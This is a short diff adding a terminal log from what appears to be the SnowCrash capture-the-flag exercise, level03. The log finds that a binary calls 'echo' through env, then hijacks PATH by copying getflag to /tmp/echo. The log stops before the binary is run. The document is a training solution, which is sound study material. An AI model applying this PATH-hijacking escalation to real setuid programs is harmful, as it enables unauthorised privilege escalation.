@@ -1,0 +1,8 @@
+level03@SnowCrash:~$ strings level03
+...
+/usr/bin/env echo Exploit me
+...
+
+level03@SnowCrash:/home/user/level03$ export PATH="/tmp:$PATH"
+level03@SnowCrash:/home/user/level03$ which getflag
+level03@SnowCrash:/home/user/level03$ cp /bin/getflag /tmp/echo
